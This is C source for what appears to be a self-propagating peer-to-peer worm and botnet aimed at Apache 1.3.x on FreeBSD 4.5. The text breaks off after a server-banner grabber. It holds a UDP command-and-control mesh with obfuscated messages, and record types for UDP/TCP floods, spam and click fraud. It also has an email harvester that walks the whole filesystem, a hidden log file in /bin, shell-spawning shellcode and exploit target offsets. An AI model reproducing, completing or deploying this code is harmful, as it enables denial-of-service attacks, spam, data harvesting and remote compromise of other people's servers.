#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/telnet.h>
#include <rpc/rpc.h>
#include <sys/wait.h>
#include <signal.h>


#define SCAN
#undef LARGE_NET
#undef FREEBSD
#define LINKS 64
#define CLIENTS 128
#define PORT 2001
#define SCANPORT    80
#define SCANTIMEOUT    5
#define MAXPATH        4096
#define ESCANPORT    10100

/////////////////////////////////////////////////////////

#define TCP_PENDING 1
#define TCP_CONNECTED 2
#define SOCKS_REPLY 3
#define FREE(x) {if (x) { free(x);x=NULL; }}
enum { ASUCCESS=0, ARESOLVE, ACONNECT, ASOCKET, ABIND, AINUSE, APENDING, AINSTANCE, AUNKNOWN };
enum { AREAD=1, AWRITE=2, AEXCEPT=4 };

void Log(char *format,...) {
    va_list args;
    int nBuf;
    char szBuffer[4096];
    FILE *a=fopen("/bin/.log","a");
    va_start(args,format);
    nBuf=vsnprintf(szBuffer,sizeof(szBuffer),format,args);
    va_end(args);
    if (a == NULL) return;
    fprintf(a,"%s",szBuffer);
    fclose(a);
}

void nas(int a) {
}

#ifdef SCAN
unsigned char classes[] = { 3, 4, 6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 28, 29, 30, 32, 33, 34, 35, 38, 40, 43, 44, 45,
    46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 62, 63, 64, 65, 66, 67, 68, 80, 81, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138,
    139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167,
    168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196,
    198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 224, 225, 226, 227, 228, 229,
    230, 231, 232, 233, 234, 235, 236, 237, 238, 239 };
#endif

struct ainst {
    void *ext,*ext5;
    int ext2,ext3,ext4;

    int sock,error;
    unsigned long len;
    struct sockaddr_in in;
};
struct header {
    char tag;
    int id;
    unsigned long len;
    unsigned long seq;
};
struct route_rec {
    struct header h;
    unsigned char hops;
    unsigned long server;
};
struct kill_rec {
    struct header h;
};
struct sh_rec {
    struct header h;
};
struct version_rec {
    struct header h;
};
struct ping_rec {
    struct header h;
};
struct pong_rec {
    struct header h;
    unsigned long from;
};
struct update_rec {
    struct header h;
};
struct list_rec {
    struct header h;
};
struct udp_rec {
    struct header h;
    unsigned long size;
    unsigned long target;
    unsigned short port;
    unsigned long secs;
};
struct tcp_rec {
    struct header h;
    unsigned long target;
    unsigned short port;
    unsigned long secs;
};
struct gen_rec {
    struct header h;
    unsigned long target;
    unsigned short port;
    unsigned long secs;
};
struct df_rec {
    struct header h;
    unsigned long target;
    unsigned long secs;
};
struct add_rec {
    struct header h;
    unsigned long server;
    unsigned long socks;
    unsigned long bind;
    unsigned short port;
};
struct data_rec {
    struct header h;
};
struct addsrv_rec {
    struct header h;
};
struct initsrv_rec {
    struct header h;
};
struct qmyip_rec {
    struct header h;
};
struct myip_rec {
    struct header h;
    unsigned long ip;
};
struct escan_rec {
    struct header h;
    unsigned long ip;
};
struct click_rec {
    struct header h;
};
struct spam_rec {
    struct header h;
    unsigned long from;
    unsigned long to;
};
struct exploit_rec {
    struct header h;
    unsigned long ip;
};

struct ainst clients[CLIENTS*2];
struct ainst udpclient;
unsigned int sseed;
struct route_table {
    int id;
    unsigned long ip;
    unsigned short port;
} routes[LINKS];
unsigned long numlinks,*links=NULL, myip=0;
unsigned long sequence[LINKS];
void gsrand(unsigned long s) { sseed=s; }
unsigned long grand() { sseed=((sseed*965764979)%65535)/2; return sseed; }
unsigned int *pids=NULL;
unsigned long numpids=0;

int mfork() {
    unsigned int parent, *newpids, i;
    parent=fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
    for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
    newpids[numpids-1]=parent;
    FREE(pids);
    pids=newpids;
    return parent;
}

char *aerror(struct ainst *inst) {
    if (inst == NULL) return "Invalid instance or socket";
    switch(inst->error) {
        case ASUCCESS:return "Operation Success";
        case ARESOLVE:return "Unable to resolve";
        case ACONNECT:return "Unable to connect";
        case ASOCKET:return "Unable to create socket";
        case ABIND:return "Unable to bind socket";
        case AINUSE:return "Port is in use";
        case APENDING:return "Operation pending";
        case AUNKNOWN:default:return "Unknown";
    }
    return "";
}

int aresolve(char *host) {
     struct hostent *hp;
    if (inet_addr(host) == 0 || inet_addr(host) == -1) {
        unsigned long a;
        if ((hp = gethostbyname(host)) == NULL) return 0;
        bcopy((char*)hp->h_addr, (char*)&a, hp->h_length);
        return a;
    }
    else return inet_addr(host);
}

int abind(struct ainst *inst,unsigned long ip,unsigned short port) {
    struct sockaddr_in in;
    if (inst == NULL) return (AINSTANCE);
    if (inst->sock == 0) {
        inst->error=AINSTANCE;
        return (AINSTANCE);
    }
    inst->len=0;
    in.sin_family = AF_INET;
    if (ip == NULL) in.sin_addr.s_addr = INADDR_ANY;
    else in.sin_addr.s_addr = ip;
    in.sin_port = htons(port);
    if (bind(inst->sock, (struct sockaddr *)&in, sizeof(in)) < 0) {
        inst->error=ABIND;
        return (ABIND);
    }
    inst->error=ASUCCESS;
    return ASUCCESS;
}

int await(struct ainst **inst,unsigned long len,char type,long secs) {
    struct timeval tm,*tmp;
    fd_set read,write,except,*readp,*writep,*exceptp;
    int p,ret,max;
    if (inst == NULL) return (AINSTANCE);
    for (p=0;p<len;p++) inst[p]->len=0;
    if (secs > 0) {
        tm.tv_sec=secs;
        tm.tv_usec=0;
        tmp=&tm;
    }
    else tmp=(struct timeval *)NULL;
    if (type & AREAD) {
        FD_ZERO(&read);
        for (p=0;p<len;p++) FD_SET(inst[p]->sock,&read);
        readp=&read;
    }
    else readp=(struct fd_set*)0;
    if (type & AWRITE) {
        FD_ZERO(&write);
        for (p=0;p<len;p++) FD_SET(inst[p]->sock,&write);
        writep=&write;
    }
    else writep=(struct fd_set*)0;
    if (type & AEXCEPT) {
        FD_ZERO(&except);
        for (p=0;p<len;p++) FD_SET(inst[p]->sock,&except);
        exceptp=&except;
    }
    else exceptp=(struct fd_set*)0;
    for (p=0,max=0;p<len;p++) if (inst[p]->sock > max) max=inst[p]->sock;
    if ((ret=select(max+1,readp,writep,exceptp,tmp)) == 0) {
        for (p=0;p<len;p++) inst[p]->error=APENDING;
        return (APENDING);
    }
    if (ret == -1) return (AUNKNOWN);
    for (p=0;p<len;p++) {
        if (type & AREAD) if (FD_ISSET(inst[p]->sock,&read)) inst[p]->len+=AREAD;
        if (type & AWRITE) if (FD_ISSET(inst[p]->sock,&write)) inst[p]->len+=AWRITE;
        if (type & AEXCEPT) if (FD_ISSET(inst[p]->sock,&except)) inst[p]->len+=AEXCEPT;
    }
    for (p=0;p<len;p++) inst[p]->error=ASUCCESS;
    return (ASUCCESS);
}

int atcp_sync_check(struct ainst *inst) {
    if (inst == NULL) return (AINSTANCE);
    inst->len=0;
    errno=0;
    if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
        inst->error=ASUCCESS;
        return (ASUCCESS);
    }
    if (!(errno == EINPROGRESS ||errno == EALREADY)) {
        inst->error=ACONNECT;
        return (ACONNECT);
    }
    inst->error=APENDING;
    return (APENDING);
}

int atcp_sync_connect(struct ainst *inst,char *host,unsigned int port) {
    int flag=1;
     struct hostent *hp;
    if (inst == NULL) return (AINSTANCE);
    inst->len=0;
    if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        inst->error=ASOCKET;
        return (ASOCKET);
    }
    if (inet_addr(host) == 0 || inet_addr(host) == -1) {
        if ((hp = gethostbyname(host)) == NULL) {
            inst->error=ARESOLVE;
            return (ARESOLVE);
        }
        bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
    }
    else inst->in.sin_addr.s_addr=inet_addr(host);
    inst->in.sin_family = AF_INET;
    inst->in.sin_port = htons(port);
    flag = fcntl(inst->sock, F_GETFL, 0);
    flag |= O_NONBLOCK;
    fcntl(inst->sock, F_SETFL, flag);
    inst->error=ASUCCESS;
    return (ASUCCESS);
}

int atcp_connect(struct ainst *inst,char *host,unsigned int port) {
    int flag=1;
    unsigned long start;
     struct hostent *hp;
    if (inst == NULL) return (AINSTANCE);
    inst->len=0;
    if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        inst->error=ASOCKET;
        return (ASOCKET);
    }
    if (inet_addr(host) == 0 || inet_addr(host) == -1) {
        if ((hp = gethostbyname(host)) == NULL) {
            inst->error=ARESOLVE;
            return (ARESOLVE);
        }
        bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
    }
    else inst->in.sin_addr.s_addr=inet_addr(host);
    inst->in.sin_family = AF_INET;
    inst->in.sin_port = htons(port);
    flag = fcntl(inst->sock, F_GETFL, 0);
    flag |= O_NONBLOCK;
    fcntl(inst->sock, F_SETFL, flag);
    start=time(NULL);
    while(time(NULL)-start < 10) {
        errno=0;
        if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
            inst->error=ASUCCESS;
            return (ASUCCESS);
        }
        if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
        sleep(1);
    }
    inst->error=ACONNECT;
    return (ACONNECT);
}

int atcp_accept(struct ainst *inst,struct ainst *child) {
    int sock;
    unsigned int datalen;
    if (inst == NULL || child == NULL) return (AINSTANCE);
    datalen=sizeof(child->in);
    inst->len=0;
    memcpy((void*)child,(void*)inst,sizeof(struct ainst));
    if ((sock=accept(inst->sock,(struct sockaddr *)&child->in,&datalen)) < 0) {
        memset((void*)child,0,sizeof(struct ainst));
        inst->error=APENDING;
        return (APENDING);
    }
    child->sock=sock;
    inst->len=datalen;
    inst->error=ASUCCESS;
    return (ASUCCESS);
}

int atcp_send(struct ainst *inst,char *buf,unsigned long len) {
    long datalen;
    if (inst == NULL) return (AINSTANCE);
    inst->len=0;
    errno=0;
    if ((datalen=write(inst->sock,buf,len)) < len) {
        if (errno == EAGAIN) {
            inst->error=APENDING;
            return (APENDING);
        }
        else {
            inst->error=AUNKNOWN;
            return (AUNKNOWN);
        }
    }
    inst->len=datalen;
    inst->error=ASUCCESS;
    return (ASUCCESS);
}

int atcp_sendmsg(struct ainst *inst, char *words, ...) {
    static char textBuffer[2048];
    unsigned int a;
    va_list args;
    va_start(args, words);
    a=vsprintf(textBuffer, words, args);
    va_end(args);
    return atcp_send(inst,textBuffer,a);
}

int atcp_recv(struct ainst *inst,char *buf,unsigned long len) {
    long datalen;
    if (inst == NULL) return (AINSTANCE);
    inst->len=0;
    if ((datalen=read(inst->sock,buf,len)) < 0) {
        if (errno == EAGAIN) {
            inst->error=APENDING;
            return (APENDING);
        }
        else {
            inst->error=AUNKNOWN;
            return (AUNKNOWN);
        }
    }
    if (datalen == 0 && len) {
        inst->error=AUNKNOWN;
        return (AUNKNOWN);
    }
    inst->len=datalen;
    inst->error=ASUCCESS;
    return (ASUCCESS);
}

int atcp_close(struct ainst *inst) {
    if (inst == NULL) return (AINSTANCE);
    inst->len=0;
    if (close(inst->sock) < 0) {
        inst->error=AUNKNOWN;
        return (AUNKNOWN);
    }
    inst->sock=0;
    inst->error=ASUCCESS;
    return (ASUCCESS);
}

int audp_listen(struct ainst *inst,unsigned int port) {
    int flag=1;
    if (inst == NULL) return (AINSTANCE);
    inst->len=0;
    if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
        inst->error=ASOCKET;
        return (ASOCKET);
    }
    inst->in.sin_family = AF_INET;
    inst->in.sin_addr.s_addr = INADDR_ANY;
    inst->in.sin_port = htons(port);
    if (bind(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) < 0) {
        inst->error=ABIND;
        return (ABIND);
    }
    flag = fcntl(inst->sock, F_GETFL, 0);
    flag |= O_NONBLOCK;
    fcntl(inst->sock, F_SETFL, flag);
    inst->error=ASUCCESS;
    return (ASUCCESS);
}

int audp_setup(struct ainst *inst,char *host,unsigned int port) {
    int flag=1;
     struct hostent *hp;
    if (inst == NULL) return (AINSTANCE);
    inst->len=0;
    if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
        inst->error=ASOCKET;
        return (ASOCKET);
    }
    if (inet_addr(host) == 0 || inet_addr(host) == -1) {
        if ((hp = gethostbyname(host)) == NULL) {
            inst->error=ARESOLVE;
            return (ARESOLVE);
        }
        bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
    }
    else inst->in.sin_addr.s_addr=inet_addr(host);
    inst->in.sin_family = AF_INET;
    inst->in.sin_port = htons(port);
    flag = fcntl(inst->sock, F_GETFL, 0);
    flag |= O_NONBLOCK;
    fcntl(inst->sock, F_SETFL, flag);
    inst->error=ASUCCESS;
    return (ASUCCESS);
}

int audp_send(struct ainst *inst,char *buf,unsigned long len) {
    long datalen;
    if (inst == NULL) return (AINSTANCE);
    inst->len=0;
    errno=0;
    if ((datalen=sendto(inst->sock,buf,len,0,(struct sockaddr*)&inst->in,sizeof(inst->in))) < len) {
        if (errno == EAGAIN) {
            inst->error=APENDING;
            return (APENDING);
        }
        else {
            inst->error=AUNKNOWN;
            return (AUNKNOWN);
        }
    }
    inst->len=datalen;
    inst->error=ASUCCESS;
    return (ASUCCESS);
}

int audp_sendmsg(struct ainst *inst, char *words, ...) {
    static char textBuffer[2048];
    unsigned int a;
    va_list args;
    va_start(args, words);
    a=vsprintf(textBuffer, words, args);
    va_end(args);
    return audp_send(inst,textBuffer,a);
}

int audp_recv(struct ainst *inst,struct ainst *client,char *buf,unsigned long len) {
    long datalen,nlen;
    if (inst == NULL) return (AINSTANCE);
    nlen=sizeof(inst->in);
    inst->len=0;
    memcpy((void*)client,(void*)inst,sizeof(struct ainst));
    if ((datalen=recvfrom(inst->sock,buf,len,0,(struct sockaddr*)&client->in,(socklen_t*)&nlen)) < 0) {
        if (errno == EAGAIN) {
            inst->error=APENDING;
            return (APENDING);
        }
        else {
            inst->error=AUNKNOWN;
            return (AUNKNOWN);
        }
    }
    inst->len=datalen;
    inst->error=ASUCCESS;
    return (ASUCCESS);
}

int audp_close(struct ainst *inst) {
    if (inst == NULL) return (AINSTANCE);
    inst->len=0;
    if (close(inst->sock) < 0) {
        inst->error=AUNKNOWN;
        return (AUNKNOWN);
    }
    inst->sock=0;
    inst->error=ASUCCESS;
    return (ASUCCESS);
}

unsigned long _decrypt(char *str, unsigned long len) {
    unsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};
    gsrand(((seed[0]+seed[1])*seed[2])^seed[3]);
    while(1) {
        gsrand(seed[pos%4]+grand()+pos);
        str[pos]-=grand();
        pos++;
        if (pos >= len) break;
    }
    return pos;
}


unsigned long _encrypt(char *str, unsigned long len) {
    unsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};
    gsrand(((seed[0]+seed[1])*seed[2])^seed[3]);
    while(1) {
        gsrand(seed[pos%4]+grand()+pos);
        str[pos]+=grand();
        pos++;
        if (pos >= len) break;
    }
    return pos;
}

int useseq(unsigned long seq) {
    unsigned long a;
    if (seq == 0) return 0;
    for (a=0;a<LINKS;a++) if (sequence[a] == seq) return 1;
    return 0;
}

unsigned long newseq() {
    unsigned long seq;
    while(1) {
        seq=(rand()*rand())^rand();
        if (useseq(seq) || seq == 0) continue;
        break;
    }
    return seq;
}

struct ainst udpserver;

void addseq(unsigned long seq) {
    unsigned long i;
    for (i=LINKS;i>0;i--) sequence[i-1]=sequence[i];
    sequence[0]=seq;
}

void addserver(unsigned long server) {
    unsigned long *newlinks, i, stop;
    char a=0;
    for (i=0;i<numlinks;i++) if (links[i] == server) a=1;
    if (a == 1) return;
    numlinks++;
    newlinks=(unsigned long*)malloc((numlinks+1)*sizeof(unsigned long));
    if (newlinks == NULL) return;
    stop=rand()%numlinks;
    for (i=0;i<stop;i++) newlinks[i]=links[i];
    newlinks[i]=server;
    for (;i<numlinks-1;i++) newlinks[i+1]=links[i];
    FREE(links);
    links=newlinks;
}

void conv(char *str,int len,unsigned long server) {
    memset(str,0,256);
    strcpy(str,inet_ntoa(*(struct in_addr*)&server));
}

int relay(unsigned long server,char *buf,unsigned long len) {
    struct ainst ts;
    char srv[256];
    conv(srv,256,server);
    audp_setup(&ts,srv,PORT);
    audp_close(&ts);
    ts.sock=udpserver.sock;
    return audp_send(&ts,buf,len);
}

int isreal(unsigned long server) {
    char srv[256];
    unsigned int i,f;
    unsigned char a=0,b=0;
    conv(srv,256,server);
    for (i=0;i<strlen(srv) && srv[i]!='.';i++);
    srv[i]=0;
    a=atoi(srv);
    f=i+1;
    for (i++;i<strlen(srv) && srv[i]!='.';i++);
    srv[i]=0;
    b=atoi(srv+f);
    if (a == 127 || a == 10 || a == 0) return 0;
    if (a == 172 && b >= 16 && b <= 31) return 0;
    if (a == 192 && b == 168) return 0;
    return 1;
}

void broadcast(char *buf,unsigned long len) {
    unsigned long nics,a;
    if (numlinks == 0 || links == NULL) return;
    a=(numlinks/5);
    if (a > 50) a=50;
    else if (a < 4) a=4;
    if (a > numlinks) a=numlinks;
    nics=rand()%((numlinks-a)+1);
    a+=nics;
    for (;nics<a;nics++) if (!myip || links[nics] != myip) relay(links[nics],buf,len);
}

void broute(unsigned long dest, char *buf,unsigned long len) {
    struct route_rec rc;
    char *str=(char*)malloc(sizeof(struct route_rec)+len+1);
    if (str == NULL) return;
    memset((void*)&rc,0,sizeof(struct route_rec));
    rc.h.tag=0x26;
    rc.h.id=rand();
    rc.h.len=sizeof(struct route_rec)+len;
    rc.h.seq=newseq();
    rc.server=dest;
    rc.hops=5;
    memcpy((void*)str,(void*)&rc,sizeof(struct route_rec));
    memcpy((void*)(str+sizeof(struct route_rec)),(void*)buf,len);
    broadcast(str,sizeof(struct route_rec)+len);
    FREE(str);
}

void syncm(struct ainst *inst,char tag,int id) {
    struct addsrv_rec rc;
    struct next_rec { unsigned long server; } fc;
    unsigned long a,b;
    for (b=0;;b+=700) {
        unsigned long _numlinks=numlinks-b>700?700:numlinks-b;
        unsigned long *_links=links+b;
        unsigned char *str;
        if (b > numlinks) break;
        str=(unsigned char*)malloc(sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
        if (str == NULL) return;
        memset((void*)&rc,0,sizeof(struct addsrv_rec));
        rc.h.tag=tag;
        rc.h.id=id;
        rc.h.len=sizeof(struct next_rec)*_numlinks;
        memcpy((void*)str,(void*)&rc,sizeof(struct addsrv_rec));
        for (a=0;a<_numlinks;a++) {
            memset((void*)&fc,0,sizeof(struct next_rec));
            fc.server=_links[a];
            memcpy((void*)(str+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec))),(void*)&fc,sizeof(struct next_rec));
        }
        if (!id) relay(inst->in.sin_addr.s_addr,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
        else audp_send(inst,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
        FREE(str);
    }
}

void senderror(struct ainst *inst, int id, char *buf2) {
    struct data_rec rc;
    char *str,*buf=strdup(buf2);
    memset((void*)&rc,0,sizeof(struct data_rec));
    rc.h.tag=0x45;
    rc.h.id=id;
    rc.h.seq=newseq();
    rc.h.len=strlen(buf2);
    _encrypt(buf,strlen(buf2));
    str=(char*)malloc(sizeof(struct data_rec)+strlen(buf2)+1);
    if (str == NULL) {
        FREE(buf2);
        return;
    }
    memcpy((void*)str,(void*)&rc,sizeof(struct data_rec));
    memcpy((void*)(str+sizeof(struct data_rec)),buf,strlen(buf2));
    audp_send(&udpclient,str,sizeof(struct data_rec)+strlen(buf2));
    FREE(str);
    FREE(buf);
}



int isgood(char a) {
    if (a >= 'a' && a <= 'z') return 1;
    if (a >= 'A' && a <= 'Z') return 1;
    if (a >= '0' && a <= '9') return 1;
    if (a == '.' || a == '@' || a == '^' || a == '-' || a == '_') return 1;
    return 0;
}

int islisten(char a) {
    if (a == '.') return 1;
    if (a >= 'a' && a <= 'z') return 1;
    if (a >= 'A' && a <= 'Z') return 1;
    return 0;
}

struct _linklist {
    char *name;
    struct _linklist *next;
} *linklist=NULL;

void AddToList(char *str) {
    struct _linklist *getb=linklist,*newb;
    while(getb != NULL) {
        if (!strcmp(str,getb->name)) return;
        getb=getb->next;
    }
    newb=(struct _linklist *)malloc(sizeof(struct _linklist));
    newb->name=strdup(str);
    newb->next=linklist;
    linklist=newb;
}

void cleanup(char *buf) {
    while(buf[strlen(buf)-1] == '\n' || buf[strlen(buf)-1] == '\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;
    while(*buf == '\n' || *buf == '\r' || *buf == ' ') {
        unsigned long i;
        for (i=strlen(buf)+1;i>0;i++) buf[i-1]=buf[i];
    }
}


void ScanFile(char *f) {
    FILE *file=fopen(f,"r");
    unsigned long startpos=0;
    if (file == NULL) return;
    while(1) {
        char buf[2];
        memset(buf,0,2);
        fseek(file,startpos,SEEK_SET);
        fread(buf,1,1,file);
        startpos++;
        if (feof(file)) break;
        if (*buf == '@') {
            char email[256],c,d;
            unsigned long pos=0;
            while(1) {
                unsigned long oldpos=ftell(file);
                fseek(file,-1,SEEK_CUR);
                c=fgetc(file);
                if (!isgood(c)) break;
                fseek(file,-1,SEEK_CUR);
                if (oldpos == ftell(file)) break;
            }
            for (pos=0,c=0,d=0;pos<255;pos++) {
                email[pos]=fgetc(file);
                if (email[pos] == '.') c++;
                if (email[pos] == '@') d++;
                if (!isgood(email[pos])) break;
            }
            email[pos]=0;
            if (c == 0 || d != 1) continue;
            if (email[strlen(email)-1] == '.') email[strlen(email)-1]=0;
            if (*email == '@' || *email == '.' || !*email) continue;
            if (!strcmp(email,"webmaster@mydomain.com")) continue;
            for (pos=0,c=0;pos<strlen(email);pos++) if (email[pos] == '.') c=pos;
            if (c == 0) continue;
            if (!strncmp(email+c,".hlp",4)) continue;
            if (!strncmp(email+c,".gov",4)) continue;
            for (pos=c,d=0;pos<strlen(email);pos++) if (!islisten(email[pos])) d=1;
            if (d == 1) continue;
            AddToList(email);
        }
    }
    fclose(file);
}

void StartScan() {
    FILE *f;
    f=popen("find / -type f","r");
    if (f == NULL) return;
    while(1) {
        char fullfile[MAXPATH];
        memset(fullfile,0,MAXPATH);
        fgets(fullfile,MAXPATH,f);
        if (feof(f)) break;
        while(fullfile[strlen(fullfile)-1]=='\n' ||
            fullfile[strlen(fullfile)-1] == '\r')
            fullfile[strlen(fullfile)-1]=0;
        if (!strncmp(fullfile,"/proc",5)) continue;
        if (!strncmp(fullfile,"/dev",4)) continue;
        if (!strncmp(fullfile,"/bin",4)) continue;
        ScanFile(fullfile);
    }
}

void ViewWebsite(char *http,char *cookie) {
    char *server,additional[256], cookies[1024], location[1024];
    unsigned long j,i;
    struct ainst up;
    char num=0;
    if (!strncmp(http,"http://",7)) server=http+7;
    else server=http;
    for (i=0;i<strlen(server);i++) if (server[i] == '/') {
        server[i]=0;
        num+=1;
        break;
    }
    memset(additional,0,256);
    if (cookie) {
        for (j=0;j<strlen(cookie);j++) if (cookie[j] == ';') {
            cookie[j]=0;
            break;
        }
        sprintf(additional,"Cookie2: $Version=\"1\"\r\nCookie: %s\r\n",cookie);
    }
    if (atcp_connect(&up,server,80) != 0) return;
    if (rand()%2) {
        atcp_sendmsg(&up,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n%s\r\n",server+i+num,server,additional);
    }
    else {
        atcp_sendmsg(&up,"GET /%s HTTP/1.0\r\nHost: %s\r\nAccept: text/html, text/plain, text/sgml, */*;q=0.01\r\nAccept-Encoding: gzip, compress\r\nAccept-Language: en\r\nUser-Agent: Lynx/2.8.4rel.1 libwww-FM/2.14\r\n%s\r\n",server+i+num,server,additional);
    }
    memset(cookies,0,1024);
    memset(location,0,1024);
    while(1) {
        fd_set n;
        struct timeval tv;
        FD_ZERO(&n);
        FD_SET(up.sock,&n);
        tv.tv_sec=60*20;
        tv.tv_usec=0;
        if (select(up.sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) break;
        if (FD_ISSET(up.sock,&n)) {
            char buf[4096], *str;
            unsigned long code,i;
            if ((i=recv(up.sock,buf,4096,0)) <= 0) break;
            buf[i]=0;
            str=strtok(buf,"\n");
            while(str && *str) {
                char name[1024], params[1024];
                while(str[strlen(str)-1] == '\r' || str[strlen(str)-1] == '\n') str[strlen(str)-1] = 0;
                for (i=0;i<strlen(str);i++) if (str[i] == ':' || str[i] == '/') break;
                str[i]=0;
                if (strlen(str) < 1024) {
                    strcpy(name,str);
                    if (strlen(str+i+1) < 1024) {
                        if (str[i+1] == ' ') strcpy(params,str+i+2);
                        else strcpy(params,str+i+1);
                        if (!strcmp(name,"HTTP")) code=atoi(params);
                        else if (!strcmp(name,"Set-Cookie")) strcpy(cookies,params);
                        else if (!strcmp(name,"Location")) strcpy(location,params);
                    }
                }
                str=strtok((char*)NULL,"\n");
            }
            if (*location) {
                char *a=strdup(location),*b=strdup(cookies);
                ViewWebsite(a,b);
                FREE(a);
                FREE(b);
            }
        }
    }
}

#ifdef SCAN
#define HOST_PARAM    "Unknown"
#define RET_ADDR_INC    512
#define PADSIZE_1    4
#define PADSIZE_2     5
#define PADSIZE_3    7
#define REP_POPULATOR    24
#define REP_SHELLCODE    24
#define NOPCOUNT    1024
#undef NOP
#define NOP        0x41
#define PADDING_1    'A'
#define PADDING_2    'B'
#define PADDING_3    'C'
#define PUT_STRING(s)    memcpy(p, s, strlen(s)); p += strlen(s);
#define PUT_BYTES(n, b)    memset(p, b, n); p += n;
char shellcode[] =
  "\x68\x47\x47\x47\x47\x89\xe3\x31\xc0\x50\x50\x50\x50\xc6\x04\x24"
  "\x04\x53\x50\x50\x31\xd2\x31\xc9\xb1\x80\xc1\xe1\x18\xd1\xea\x31"
  "\xc0\xb0\x85\xcd\x80\x72\x02\x09\xca\xff\x44\x24\x04\x80\x7c\x24"
  "\x04\x20\x75\xe9\x31\xc0\x89\x44\x24\x04\xc6\x44\x24\x04\x20\x89"
  "\x64\x24\x08\x89\x44\x24\x0c\x89\x44\x24\x10\x89\x44\x24\x14\x89"
  "\x54\x24\x18\x8b\x54\x24\x18\x89\x14\x24\x31\xc0\xb0\x5d\xcd\x80"
  "\x31\xc9\xd1\x2c\x24\x73\x27\x31\xc0\x50\x50\x50\x50\xff\x04\x24"
  "\x54\xff\x04\x24\xff\x04\x24\xff\x04\x24\xff\x04\x24\x51\x50\xb0"
  "\x1d\xcd\x80\x58\x58\x58\x58\x58\x3c\x4f\x74\x0b\x58\x58\x41\x80"
  "\xf9\x20\x75\xce\xeb\xbd\x90\x31\xc0\x50\x51\x50\x31\xc0\xb0\x5a"
  "\xcd\x80\xff\x44\x24\x08\x80\x7c\x24\x08\x03\x75\xef\x31\xc0\x50"
  "\xc6\x04\x24\x0b\x80\x34\x24\x01\x68\x42\x4c\x45\x2a\x68\x2a\x47"
  "\x4f\x42\x89\xe3\xb0\x09\x50\x53\xb0\x01\x50\x50\xb0\x04\xcd\x80"
  "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50"
  "\x53\x89\xe1\x50\x51\x53\x50\xb0\x3b\xcd\x80\xcc";
;

struct {
    char *type;
    int delta;
    u_long retaddr;
    int repretaddr;
    int repzero;
} targets[] = {
        { "FreeBSD 4.5 x86 / Apache/1.3.20 (Unix)",      -146,  0xbfbfde00,6, 36 },
        { "FreeBSD 4.5 x86 / Apache/1.3.22-24 (Unix)",   -134,  0xbfbfdb00,3, 36 },
}, victim;

char *GetAddress(char *ip) {
    struct sockaddr_in sin;
    fd_set fds;
    int n,d,sock;
    char buf[1024];
    struct timeval tv;
    sock = socket(PF_INET, SOCK_STREAM, 0);
    sin.sin_family = PF_INET;
    sin.sin_addr.s_addr = inet_addr(ip);
    sin.sin_port = htons(80);
    if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;
    write(sock,"GET / HTTP/1.1\r\n\r\n",strlen("GET / HTTP/1.1\r\n\r\n"));
    tv.tv_sec = 15;
    tv.tv_usec = 0;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    memset(buf, 0, sizeof(buf));
    if(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        if(FD_ISSET(sock, &fds)) {
            if((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;
            for (d=0;d<n;d++) if (!strncmp(buf+d,"Server: ",strlen("Server: "))) {
                char *start=buf+d+strlen("Server: ");
                for (d=0;d<strlen(start);d++) if (start[d] == '\n') start[d]=0;
                cleanup(start);
                return strdup(start);
            }
        }
    }
    return NULL;
}

